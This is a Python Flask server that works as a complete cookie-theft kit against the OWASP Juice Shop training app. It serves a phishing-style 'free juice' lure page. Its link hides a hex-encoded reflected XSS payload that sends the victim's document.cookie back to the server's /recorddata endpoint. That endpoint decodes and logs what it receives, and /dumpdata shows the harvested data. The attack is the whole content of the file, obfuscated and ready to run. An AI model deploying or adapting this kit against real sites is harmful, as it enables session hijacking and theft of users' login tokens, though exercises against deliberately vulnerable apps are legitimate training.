#! /usr/bin/env python2

from os.path import isfile
from time import asctime
from commands import getoutput
from base64 import b64decode

from flask import Flask, redirect, render_template, request

app = Flask(__name__)


@app.route('/', methods=['GET'])
def hello():
    return "I'm in the app!"


@app.route('/heartbeat', methods=['GET'])
def heartbeat():
    uptime = getoutput('uptime')
    return "I am alive at %s. Last checked %s" % (uptime, asctime())


@app.route('/dumpdata', methods=['GET'])
def dumpdata():
    datafile = "/tmp/alldata.txt"
    if not isfile(datafile):
        return "Sorry, server contains no data :-("
    with open(datafile) as f:
        lines = f.readlines()
    data = '<html><BODY>'
    for line in lines:
        data = data + line + '<br>'
    data += '</BODY></html>'
    return data


@app.route('/recorddata', methods=['GET'])
def recorddata():
    decrypted_data = str()
    data = request.query_string
    if request.args.get('token'):
        decrypted_data = b64decode(data.split('.')[1])
        with open("/tmp/alldata.txt", "a") as file:
            data = data + '\n' + decrypted_data
            data += '\n\n'
            file.write(data)
    return redirect("https://juice-shop.herokuapp.com", code=302)


@app.route('/whoami', methods=['GET'])
def whoami():
    return request.url_root


@app.route('/freejuice', methods=['GET'])
def freejuice():
    xss_html = r'''<!DOCTYPE html>
<head>
   <style>
      .blink_me {
      animation: blinker 1s linear infinite;
      }
      @keyframes blinker {
      50% {
      opacity: 0;
      }
      }
      body { background-color: #93B874; }
      h1 { background-color: orange; }
   </style>
   <title>Get a free juice!</title>
   <meta http-equiv="content-type" content="text/html;charset=utf-8" />
</head>
<body>
   <center>
      <div class="blink_me">
         <h1>Winner!  Winner! Chicken Dinner!</h1>
      </div>
      <p> Lucky winner!  You won a free juice from the Owasp Juice Shop!  Just <a href="https://juice-shop.herokuapp.com/#/search?q=%3c%73%63%72%69%70%74%3e%76%61%72%20%78%73%65%73%73%69%6f%6e%3d%64%6f%63%75%6d%65%6e%74%2e%72%65%66%65%72%72%65%72%2e%73%70%6c%69%74%28%22%2f%66%72%65%65%6a%75%69%63%65%22%29%2e%74%6f%53%74%72%69%6e%67%28%29%2e%72%65%70%6c%61%63%65%28%22%2c%22%2c%22%2f%22%29%2e%63%6f%6e%63%61%74%28%22%72%65%63%6f%72%64%64%61%74%61%3f%22%29%2e%63%6f%6e%63%61%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%78%73%65%73%73%69%6f%6e%29%3b%20%76%61%72%20%78%68%74%74%70%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%20%78%68%74%74%70%2e%6f%70%65%6e%28%22%47%45%54%22%2c%20%78%73%65%73%73%69%6f%6e%2c%20%74%72%75%65%29%3b%20%78%68%74%74%70%2e%73%65%6e%64%28%29%3b%20%3c%2f%73%63%72%69%70%74%3e">click here</a> to claim!  </p>
   </center>
</body>
</html>
'''
    #return render_template('xss.html')
    return xss_html


if __name__ == "__main__":
    app.run()
